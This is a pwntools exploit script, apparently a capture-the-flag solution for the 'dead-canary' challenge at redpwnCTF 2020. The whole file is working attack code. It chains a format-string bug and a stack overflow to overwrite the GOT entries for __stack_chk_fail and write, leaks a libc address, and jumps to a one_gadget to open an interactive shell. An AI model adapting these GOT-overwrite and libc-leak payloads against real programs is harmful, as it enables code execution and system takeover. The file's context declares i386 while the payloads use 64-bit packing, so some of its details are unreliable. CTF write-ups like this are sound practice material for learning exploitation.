from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "../bin/dead-canary"
HOST = "2020.redpwnc.tf"
PORT = 31744

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = 0x400737 
got_chk_fail = elf.got["__stack_chk_fail"]
plt_write = elf.plt["write"]
got_write = elf.got["write"]

libc = ELF('../libc.so.6')
#libc_binsh = next(libc.search("/bin/sh"))
off_ret_main = 0x21b97
gadget = [0x4f2c5, 0x4f322, 0x10a38c]

def exploit():
	format_off = 6
	# trigger bof
	# overwrite value in got_chk_fail to the address of main func
	# libc leak using the value of return address from main func
	payload = fsb(2, format_off+(0x20/8), addr_main, 0, 1)
	payload += ",%41$p"
	payload += "A"*(0x20-len(payload))
	payload += p64(got_chk_fail)
	payload += "A"*(0x110-len(payload))
	
	conn.sendlineafter("name: ", payload)	
	conn.recvuntil(",")
	
	libc_ret_main = int(conn.recvuntil("A")[:-1], 16)
	libc_base = libc_ret_main - off_ret_main
	one_gadget = libc_base + gadget[2]
	print hex(libc_base)
	
	# trigger bof
	# overwrite lower 4-byte value in got_write to one_gadget
	payload = fsb(2, format_off+(0x30/8), one_gadget, 0, 3)
	payload += "A"*(0x30-len(payload))
	payload += p64(got_write)
	payload += p64(got_write+2)
	payload += p64(got_write+4)
	payload += "\x00"*(0x110-len(payload))
	
	conn.sendlineafter("name: ", payload)	
	
	# trigger bof
	payload = fsb(2, format_off+(0x20/8), plt_write, 0, 1)
	payload += "\x00"*(0x20-len(payload))
	payload += p64(got_chk_fail)
	payload += "\x00"*(0x110-len(payload))
	
	conn.sendlineafter("name: ", payload)	

	conn.interactive()	

if __name__ == "__main__":
	exploit()	
